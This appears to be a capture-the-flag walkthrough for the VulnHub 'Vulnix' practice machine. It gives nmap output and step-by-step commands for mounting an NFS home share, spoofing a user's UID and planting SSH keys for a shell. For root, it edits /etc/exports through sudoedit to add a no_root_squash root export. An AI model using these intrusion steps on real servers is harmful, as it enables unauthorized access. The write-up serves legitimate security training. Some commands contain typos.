# Machine Link
https://www.vulnhub.com/entry/hacklab-vulnix,48/

# IP
192.168.1.199

# nmap

```bash
nmap -v -p- 192.168.1.199

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
79/tcp    open  finger
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
41698/tcp open  unknown
45325/tcp open  unknown
51336/tcp open  unknown
51516/tcp open  unknown
54801/tcp open  unknown
```

Full Scan
```bash
nmap -v -p- -sC -sV -sT -A -O -T 5 192.168.1.199

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_ssl-date: 2025-02-27T11:55:24+00:00; -1h00m19s from scanner time.
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=vulnix
| Issuer: commonName=vulnix
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:12
| Not valid after:  2022-08-31T17:40:12
| MD5:   58e3:f1ac:fef6:b6d1:744c:836f:ba24:4f0a
|_SHA-1: 712f:69ba:8c54:32e5:711c:898b:55ab:0a83:44a0:420b
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\\x0D
110/tcp   open  pop3       Dovecot pop3d
|_ssl-date: 2025-02-27T11:55:24+00:00; -1h00m19s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
|_pop3-capabilities: RESP-CODES UIDL CAPA STLS SASL PIPELINING TOP
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34518/udp   mountd
|   100005  1,2,3      41698/tcp   mountd
|   100005  1,2,3      46353/udp6  mountd
|   100005  1,2,3      55143/tcp6  mountd
|   100021  1,3,4      40111/tcp6  nlockmgr
|   100021  1,3,4      44305/udp   nlockmgr
|   100021  1,3,4      45325/tcp   nlockmgr
|   100021  1,3,4      51756/udp6  nlockmgr
|   100024  1          38574/udp   status
|   100024  1          40974/tcp6  status
|   100024  1          43034/udp6  status
|   100024  1          54801/tcp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
|_imap-capabilities: LITERAL+ IMAP4rev1 OK LOGINDISABLEDA0001 STARTTLS more listed capabilities have Pre-login LOGIN-REFERRALS post-login SASL-IR ENABLE ID IDLE
|_ssl-date: 2025-02-27T11:55:24+00:00; -1h00m19s from scanner time.
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
|_ssl-date: 2025-02-27T11:55:24+00:00; -1h00m19s from scanner time.
|_imap-capabilities: LITERAL+ IMAP4rev1 have capabilities more listed OK AUTH=PLAINA0001 Pre-login LOGIN-REFERRALS post-login SASL-IR ENABLE ID IDLE
995/tcp   open  ssl/pop3   Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL CAPA SASL(PLAIN) USER PIPELINING TOP
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
|_ssl-date: 2025-02-27T11:55:24+00:00; -1h00m19s from scanner time.
2049/tcp  open  nfs        2-4 (RPC #100003)
41698/tcp open  mountd     1-3 (RPC #100005)
45325/tcp open  nlockmgr   1-4 (RPC #100021)
51336/tcp open  mountd     1-3 (RPC #100005)
51516/tcp open  mountd     1-3 (RPC #100005)
54801/tcp open  status     1 (RPC #100024)
MAC Address: 08:00:27:67:5A:DE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Uptime guess: 0.025 days (since Thu Feb 27 17:49:49 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h00m19s, deviation: 0s, median: -1h00m19s

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.1.199
```

---
## Enumerating nfs

```bash
showmount -e $IP
```
<img width="425" height="91" alt="image" src="https://github.com/user-attachments/assets/7bfd40b1-0a3c-4700-89e2-359d9e61a0d8" />


From this information we found that a user vulnix home directory is shared on nfs.

So lets try and mount it :

```bash
mkdir /mnt/vulnix
mount $IP:/home/vulnix /mnt/vulnix -o vers=3
```

(If we dont use the -o vers=3 than it will mount the directory as nobody user, and we cannot change the permission of the directory, but if we mount through vers 3 than we get the vulnix user with UID=5008)

So lets make a user named vulnix with UID 5008 :
```bash
adduser - u 5008 vulnix
```
<img width="896" height="464" alt="image" src="https://github.com/user-attachments/assets/6e2e3e7e-3c01-4f3f-98a6-1912f69e896d" />

Now change to this user and go inside the vulnix directory
```bash
su - vulnix
cd /mnt/vulnix
```

Nothing useful is found in the directory so we will create a .ssh directory and place the keys :
```bash
#with our vulnix user
mkdir /mnt/vulnix/.ssh
cd /mnt/vulnix.ssh

#generate keys on home directory of vulnix user with :
ssh-keygen -t ssh-rsa

#now copy the id_rsa.pub and rename it as authorized_keys
cp /home/vulnix/.ssh/id_rsa.pub /mnt/vulnix/.ssh/autorized_keys
```

Now with the id_rsa private key on the .ssh of home directory of vulnix user, use ssh to make a connection :
```bash
cd /home/vulnix/.ssh

ssh -o 'PubKeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@$IP
```

We got the SHELL!!
<img width="918" height="809" alt="image" src="https://github.com/user-attachments/assets/894e86b9-de21-4ce1-a005-82c95ebf0bc3" />


---

# Privilege Escalation

First checking for sudo configurations.
<img width="1074" height="231" alt="image" src="https://github.com/user-attachments/assets/7628d75c-b309-4c98-9323-a21c3a3020ba" />


We can use `sudoedit /etc/exports` as root without password so lets edit the exports file and add root directory entry along with `no_root_squash` :
<img width="1830" height="1004" alt="image" src="https://github.com/user-attachments/assets/f0022709-359e-409d-b4c0-c994542e0497" />

Now we need to manually restart the machine as there is no way to restart the service.
After restarting the machine when we use showmount command it will show use the root directory :

```bash
showmount -e $IP
```
<img width="506" height="113" alt="image" src="https://github.com/user-attachments/assets/faac6a72-8650-478f-abe6-e03e27645afc" />

So lets create a vulnixroot directory in mount and mount the share :
```bash
mkdir /mnt/vulnixroot
mount $IP:/root /mnt/vulnixroot -o vers=3
```

Now at this point we can see the root flag but to get the proper root terminal we can do the same thing we did previously. Use root account of main system to copy authorized_keys file to .ssh locaiton of /root directory which we just mounted :

First make a .ssh directory on /mnt/vulnixroot :

```bash
sudo su
cd /mnt/vulnixroot
mkdir .ssh
```

Now generate keys :
```bash
ssh-keygen -t ssh-rsa

#copy the id_rsa.pub to .ssh of mounted root as authorized_keys
cp /root/.ssh/id_rsa.pub /mnt/vulnixroot/.ssh/authorized_keys
```
*(Remeber to delete the keys on main systems root location later)

Now use the private key to make ssh connection as root :

```bash
ssh -o 'PubKeyAcceptedKeyTypes +ssh-rsa' -i id_rsa root@192.168.1.199
```

<img width="958" height="981" alt="image" src="https://github.com/user-attachments/assets/2ea7906c-67c7-4654-9f06-2820bd1e18d1" />

We got the root shell!!!

---
